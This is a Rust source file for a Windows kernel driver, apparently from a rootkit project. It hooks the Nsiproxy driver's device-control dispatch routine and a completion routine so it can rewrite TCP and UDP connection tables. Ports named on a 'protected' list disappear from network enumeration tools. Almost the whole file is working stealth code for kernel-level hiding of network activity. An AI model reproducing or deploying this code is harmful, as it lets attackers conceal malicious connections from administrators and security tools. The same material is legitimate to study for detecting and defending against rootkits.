use {
    alloc::vec::Vec,
    log::{error, warn},
    spin::{Mutex, lazy::Lazy},
    wdk_sys::{
        *, 
        _MODE::KernelMode,
        ntddk::{ExFreePool, ObfDereferenceObject, ProbeForRead}, 
    },
    core::{
        ptr::{null_mut, copy},
        sync::atomic::{AtomicPtr, Ordering, AtomicBool},
        ffi::c_void, mem::size_of, slice::from_raw_parts_mut,
    },
};

use {
    common::{
        structs::TargetPort,
        enums::{PortType, Protocol}, 
    },
    crate::{
        error::ShadowError,
        utils::{
            pool::PoolMemory, uni::str_to_unicode,
            valid_kernel_memory, valid_user_memory,
        },
        data::{
            COMUNICATION_TYPE,
            ObReferenceObjectByName, IoDriverObjectType,
            NSI_UDP_ENTRY, NSI_PARAM, NSI_TABLE_TCP_ENTRY,
            NSI_STATUS_ENTRY, NSI_PROCESS_ENTRY
        },
    }
};

const MAX_PORT: usize = 100;

/// Holds the original NSI dispatch function, used to store the original pointer before hooking.
static mut ORIGINAL_NSI_DISPATCH: AtomicPtr<()> = AtomicPtr::new(null_mut());

/// Indicates whether the callback has been activated.
pub static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);

/// List of protected ports, synchronized with a mutex.
///
/// This static variable holds the list of protected network ports, using a `Mutex` to ensure
/// thread-safe access. It is initialized with a capacity of `MAX_PORT`.
pub static PROTECTED_PORTS: Lazy<Mutex<Vec<TargetPort>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(100)));

/// Represents a Port structure used for hooking into the NSI proxy driver and intercepting network information.
pub struct Port;

impl Port {
    /// Control code for the NSI communication.
    const NIS_CONTROL_CODE: u32 = 1179675;

    /// Network driver name.
    const NSI_PROXY: &str = "\\Driver\\Nsiproxy";

    /// Installs a hook into the NSI proxy driver to intercept network table operations.
    ///
    /// This function installs a hook into the NSI proxy driver by replacing the `IRP_MJ_DEVICE_CONTROL`
    /// dispatch function with a custom hook (`hook_nsi`). It stores the original function in a static 
    /// atomic pointer for later restoration.
    ///
    /// # Returns
    /// 
    /// * `Ok(NTSTATUS)` - If the hook is installed successfully.
    /// * `Err(ShadowError)` - If the hook installation fails or no valid dispatch function is found.
    pub unsafe fn install_hook() -> Result<NTSTATUS, ShadowError> {
        let mut driver_object: *mut DRIVER_OBJECT = null_mut();
        let status = ObReferenceObjectByName(
            &mut str_to_unicode(Self::NSI_PROXY).to_unicode(), 
            OBJ_CASE_INSENSITIVE, 
            null_mut(), 
            0, 
            *IoDriverObjectType, 
            KernelMode as i8, 
            null_mut(), 
            &mut driver_object as *mut _ as *mut *mut core::ffi::c_void 
        );

        // Check if the driver object was referenced successfully.
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ObReferenceObjectByName", status))
        }

        // Try to replace the original IRP_MJ_DEVICE_CONTROL dispatch function.
        let major_function = &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];
        if let Some(original_function) = major_function.take() {
            // Store the original dispatch function.
            let original_function_ptr = original_function as *mut ();
            ORIGINAL_NSI_DISPATCH.store(original_function_ptr, Ordering::SeqCst);
    
            // Replace the dispatch function with the hook.
            *major_function = Some(Self::hook_nsi);
            HOOK_INSTALLED.store(true, Ordering::SeqCst);
        } else {
            ObfDereferenceObject(driver_object as _);
            return Err(ShadowError::HookFailure);
        }

        // Dereference the driver object after setting up the hook.
        ObfDereferenceObject(driver_object as _);
        Ok(STATUS_SUCCESS)
    }

    /// Uninstalls the NSI hook, restoring the original dispatch function.
    ///
    /// This function uninstalls the previously installed NSI hook, restoring the original dispatch
    /// function that was replaced.
    ///
    /// # Returns
    /// 
    /// * `Ok(NTSTATUS)` - If the hook was successfully uninstalled.
    /// * `Err(ShadowError)` - If the hook was not installed or if the uninstall operation failed.
    pub unsafe fn uninstall_hook() -> Result<NTSTATUS, ShadowError> {
        let mut driver_object: *mut DRIVER_OBJECT = null_mut();
        let status = ObReferenceObjectByName(
            &mut str_to_unicode(Self::NSI_PROXY).to_unicode(),
            OBJ_CASE_INSENSITIVE,
            null_mut(),
            0,
            *IoDriverObjectType,
            KernelMode as i8,
            null_mut(),
            &mut driver_object as *mut _ as *mut *mut c_void,
        );

        // Handle error if the driver object can't be referenced.
        if !NT_SUCCESS(status) {
            return Err(ShadowError::ApiCallFailed("ObReferenceObjectByName", status))
        }
    
        // If the hook is installed, restore the original dispatch function.
        if HOOK_INSTALLED.load(Ordering::SeqCst) {
            let major_function = &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];

            let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
            if !original_function_ptr.is_null() {
                let original_function: PDRIVER_DISPATCH = core::mem::transmute(original_function_ptr);
                *major_function = original_function;
    
                HOOK_INSTALLED.store(false, Ordering::SeqCst);
            } else {
                ObfDereferenceObject(driver_object as _);
                return Err(ShadowError::HookFailure);
            }
        } else {
            ObfDereferenceObject(driver_object as _);
            return Err(ShadowError::HookFailure);
        }
    
        // Dereference the driver object after removing the hook.
        ObfDereferenceObject(driver_object as _);
        Ok(STATUS_SUCCESS)
    }

    /// Hooked dispatch function that intercepts NSI proxy requests and modifies network table entries.
    ///
    /// This function intercepts network requests (IRPs) sent to the NSI proxy driver when the control
    /// code matches `NIS_CONTROL_CODE`. It replaces the completion routine with a custom handler
    /// to inspect and potentially modify network entries.
    ///
    /// # Arguments
    ///
    /// * `device_object` - Pointer to the device object associated with the request.
    /// * `irp` - Pointer to the IRP (I/O Request Packet) being processed.
    ///
    /// # Returns
    ///
    /// * The result of the original dispatch function, or `STATUS_UNSUCCESSFUL` if the hook fails.
    unsafe extern "C" fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
        let stack = (*irp).Tail.Overlay.__bindgen_anon_2.__bindgen_anon_1.CurrentStackLocation;
        let control_code = (*stack).Parameters.DeviceIoControl.IoControlCode;

        // If the control code matches, we replace the completion routine with a custom one.
        if control_code == Self::NIS_CONTROL_CODE {
            let context = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<(PIO_COMPLETION_ROUTINE, *mut c_void)>() as u64, u32::from_be_bytes(*b"giud"));
            if let Some(addr) = context {
                let address = addr.ptr as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);
                (*address).0 = (*stack).CompletionRoutine;
                (*address).1 = (*stack).Context;

                (*stack).Context = address as *mut c_void;
                (*stack).CompletionRoutine = Some(Self::irp_complete);
                (*stack).Control |= SL_INVOKE_ON_SUCCESS as u8;

                // Prevent memory deallocation.
                core::mem::forget(addr);
            }
        }

        // Call the original dispatch function.
        let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
        let original_function: PDRIVER_DISPATCH = core::mem::transmute(original_function_ptr);

        original_function.map_or(STATUS_UNSUCCESSFUL, |func| func(device_object, irp))
    }
    
    /// Completion routine that modifies network table entries after an NSI operation.
    ///
    /// This function is called when the IRP operation completes, and it processes the network
    /// table entries (TCP/UDP) to inspect or modify them. It then calls the original completion
    /// routine, passing the results of the modified entries back to the caller.
    ///
    /// # Arguments
    ///
    /// * `device_object` - Pointer to the device object associated with the IRP.
    /// * `irp` - Pointer to the IRP being completed.
    /// * `context` - Pointer to the context, containing the original completion routine and its arguments.
    ///
    /// # Returns
    ///
    /// * Returns the result of the original completion routine, or `STATUS_SUCCESS` if processing was successful.
    unsafe extern "C" fn irp_complete(
        device_object: *mut DEVICE_OBJECT, 
        irp: *mut IRP, 
        context: *mut c_void
    ) -> NTSTATUS {
        let context_addr = context as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);

         // Validate the status of the IRP.
        if NT_SUCCESS((*irp).IoStatus.__bindgen_anon_1.Status) {
            let nsi_param = (*irp).UserBuffer as *mut NSI_PARAM;
            let mut status_success = true;

            // Ensure that the NSI parameter is valid and the context can be accessed.
            if !valid_user_memory(nsi_param as u64) && !PortUtils::validate_context(nsi_param as _) {
                status_success = false;
            } else if valid_kernel_memory(nsi_param as u64) || nsi_param.is_null() {
                status_success = false;
            }

            // If the entries are valid, process them.
            if status_success && !(*nsi_param).Entries.is_null() && (*nsi_param).EntrySize != 0 {
                let tcp_entries = (*nsi_param).Entries as *mut NSI_TABLE_TCP_ENTRY;
                let udp_entries = (*nsi_param).Entries as *mut NSI_UDP_ENTRY;

                // Loop through all entries in the NSI parameter.
                for i in 0..(*nsi_param).Count {
                    match (*nsi_param).Type_ {
                        COMUNICATION_TYPE::TCP => {
                            if valid_user_memory((*tcp_entries.add(i)).Local.Port as u64) 
                                || valid_user_memory((*tcp_entries.add(i)).Remote.Port as u64) {

                                // Convert the port numbers from big-endian to the host's native format.
                                let local_port = u16::from_be((*tcp_entries.add(i)).Local.Port);
                                let remote_port = u16::from_be((*tcp_entries.add(i)).Remote.Port);

                                // Process the TCP entry by copying it into the NSI table, updating ports if necessary.
                                PortUtils::process_entry_copy(
                                    tcp_entries,
                                    (*nsi_param).Count,
                                    i,
                                    local_port,
                                    Some(remote_port),
                                    Protocol::TCP,
                                    (*nsi_param).StatusEntries,
                                    (*nsi_param).ProcessEntries,
                                    nsi_param,
                                );
                            }
                        },
                        COMUNICATION_TYPE::UDP => {
                            // Check if the UDP local port is a valid user-mode memory address.
                            if valid_user_memory((*udp_entries.add(i)).Port as u64) {

                                // Convert the local port number from big-endian to the host's native format.
                                let local_port = u16::from_be((*udp_entries.add(i)).Port);

                                // Process the UDP entry by copying it into the NSI table, updating ports if necessary.
                                PortUtils::process_entry_copy(
                                    udp_entries,
                                    (*nsi_param).Count,
                                    i,
                                    local_port,
                                    None,
                                    Protocol::UDP,
                                    (*nsi_param).StatusEntries,
                                    (*nsi_param).ProcessEntries,
                                    nsi_param,
                                );
                            }
                        }
                    }
                }
            }
        }

        // Call the original completion routine if one exists.
        if let Some(original_routine) = (*context_addr).0 {
            let mut original_context = null_mut();

            if !(*context_addr).1.is_null() {
                original_context = (*context_addr).1;
            }
    
            ExFreePool(context as *mut _);
            return original_routine(device_object, irp, original_context);
        }

        ExFreePool(context as *mut _);
        STATUS_SUCCESS
    }
}

/// Utility struct for network-related operations, such as validating memory and handling NSI table entries.
pub struct PortUtils;

impl PortUtils {
    /// Validates a memory address to ensure it can be safely accessed from kernel mode.
    ///
    /// This function uses `ProbeForRead` to check whether a memory address is valid and accessible.
    /// It wraps the operation in a Structured Exception Handling (SEH) block to catch and log any exceptions.
    ///
    /// # Arguments
    /// 
    /// * `address` - The memory address to validate.
    ///
    /// # Returns
    /// 
    /// * Return `true` if the address is valid and accessible or `false` if an exception occurs while probing the address.
    unsafe fn validate_context(address: *mut c_void) -> bool {
        let result = microseh::try_seh(|| {
            ProbeForRead(address, size_of::<NSI_PARAM>() as u64, size_of::<NSI_PARAM>() as u32);
        });
    
        match result {
            Ok(_) => true,
            Err(err) => {
                error!("Exception when trying to read the address: {:?}", err.code());
                false
            }
        }
    }

    /// Copies network table entries (TCP/UDP) from one index to another and updates associated status
    /// and process entries if necessary.
    ///
    /// This function is used to modify NSI (Network Store Interface) table entries during a network 
    /// hook operation. It copies TCP/UDP entries, status entries, and process entries, effectively 
    /// "hiding" specific network ports.
    ///
    /// # Arguments
    /// 
    /// * `entries` - A pointer to the list of TCP or UDP entries. The type is generic (`T`), and the pointer must be safely dereferenced.
    /// * `count` - The total number of entries in the table. Defines the size of the `entries` buffer.
    /// * `i` - The index of the current entry being processed.
    /// * `local_port` - The local port number associated with the current entry.
    /// * `remote_port` - An `Option<u16>` that may contain the remote port number associated with the current entry, or `None`.
    /// * `protocol` - The protocol type (TCP or UDP) being processed for this entry.
    /// * `status_entries` - A pointer to the list of status entries related to the network connections.
    /// * `process_entries` - A pointer to the list of process entries related to the network connections.
    /// * `nsi_param` - A pointer to the `NSI_PARAM` structure, which contains information about the network table.
    unsafe fn process_entry_copy<T: Sized>(
        entries: *mut T,
        count: usize,
        i: usize,
        local_port: u16,
        remote_port: Option<u16>,
        protocol: Protocol,
        status_entries: *mut NSI_STATUS_ENTRY,
        process_entries: *mut NSI_PROCESS_ENTRY,
        nsi_param: *mut NSI_PARAM
    ) {
        let port_number = match (local_port, remote_port) {
            (0, Some(remote)) if remote != 0 => remote, // Use remote port if local is zero.
            (local, _) if local != 0 => local, // Use local port if it's non-zero.
            _ => {
                warn!("Both doors are zero, there is no way to process the entrance.");
                return;
            }
        };    
        
        let port_type = if remote_port.unwrap_or(0) != 0 {
            PortType::REMOTE
        } else {
            PortType::LOCAL
        };

        let info = TargetPort {
            protocol,
            port_type,
            port_number,
            enable: true,
        };

        // If the port is protected, modify the network entries.
        if check_port(info) {
            let mut entries_index = i + 1;
            if entries_index >= count {
                entries_index = i - 1;
            }
    
            // Copies TCP/UDP entries.
            let entries_slice = from_raw_parts_mut(entries, count);
            copy(
                &entries_slice[entries_index],
                &mut entries_slice[i],
                count - entries_index,
            );
        
            // Verify and copy status_entries.
            if !status_entries.is_null() {
                let status_entries_slice = from_raw_parts_mut(status_entries, count);
                if entries_index < status_entries_slice.len() {
                    copy(
                        &status_entries_slice[entries_index],
                        &mut status_entries_slice[i],
                        count - entries_index,
                    );
                }
            }
        
            // Check and copy process_entries.
            if !process_entries.is_null() {
                let process_entries_slice = from_raw_parts_mut(process_entries, count);
                if entries_index < process_entries_slice.len() {
                    copy(
                        &process_entries_slice[entries_index],
                        &mut process_entries_slice[i],
                        count - entries_index,
                    );
                }
            }
        }
    }
}

/// Toggles the addition or removal of a port from the list of protected ports.
///
/// If the `enable` flag in the `TargetPort` is `true`, the port is added to the list of protected ports.
/// Otherwise, the port is removed from the list.
///
/// # Arguments
///
/// * `port` - A mutable pointer to a `TargetPort` structure, containing information about the port 
///   to be added or removed.
///
/// # Return
///
/// * Returns `STATUS_SUCCESS` if the operation is completed successfully or 
///   `STATUS_UNSUCCESSFUL` if the operation fails (e.g., the port list is full or the port couldn't be removed).
pub fn add_remove_port_toggle(port: *mut TargetPort) -> NTSTATUS {
    if (unsafe { *port }).enable {
        add_target_port(port)
    } else {
        remove_target_port(port)
    }
}

/// Adds a port to the list of protected ports.
///
/// This function locks the `PROTECTED_PORTS` list and tries to add the given `TargetPort`.
/// If the port is already in the list or the list is full, the operation will fail.
///
/// # Arguments
///
/// * `port` - A mutable pointer to a `TargetPort` structure, containing the port information to be added.
///
/// # Return
///
/// * Returns `STATUS_SUCCESS` if the port is successfully added to the list.
/// * Returns `STATUS_DUPLICATE_OBJECTID` if the port already exists in the list.
/// * Returns `STATUS_UNSUCCESSFUL` if the port list is full or the operation fails.
fn add_target_port(port: *mut TargetPort) -> NTSTATUS {
    let mut ports = PROTECTED_PORTS.lock();
    let port = unsafe { *port };

    if ports.len() >= MAX_PORT {
        return STATUS_UNSUCCESSFUL;
    }

    if ports.contains(&port) {
        return STATUS_DUPLICATE_OBJECTID;
    }

    ports.push(port);

    STATUS_SUCCESS
}

/// Removes a port from the list of protected ports.
///
/// This function locks the `PROTECTED_PORTS` list and attempts to remove the specified `TargetPort`.
///
/// # Arguments
///
/// * `port` - A mutable pointer to a `TargetPort` structure, containing the port information to be removed.
///
/// # Return
///
/// * Returns `STATUS_SUCCESS` if the port is successfully removed from the list 
///   or `STATUS_UNSUCCESSFUL` if the port is not found in the list.
fn remove_target_port(port: *mut TargetPort) -> NTSTATUS {
    let mut ports = PROTECTED_PORTS.lock();
    (unsafe { *port }).enable = true;

    if let Some(index) = ports.iter().position(|&p| { 
        p.protocol == (unsafe { *port }).protocol
        && p.port_type == (unsafe { *port }).port_type
        && p.port_number == (unsafe { *port }).port_number
    }) {
        ports.remove(index);
        STATUS_SUCCESS
    } else {
        error!("Port {:?} not found in the list", port);
        STATUS_UNSUCCESSFUL
    }
}

/// Checks if a port is in the list of protected ports.
///
/// This function locks the `PROTECTED_PORTS` list and checks whether the given port is in the list.
///
/// # Arguments
///
/// * `port` - A `TargetPort` structure that represents the port to be checked.
///
/// # Return
///
/// * Returns `true` if the port is in the protected list, otherwise returns `false`.
pub fn check_port(port: TargetPort) -> bool {
    PROTECTED_PORTS.lock().contains(&port)
}
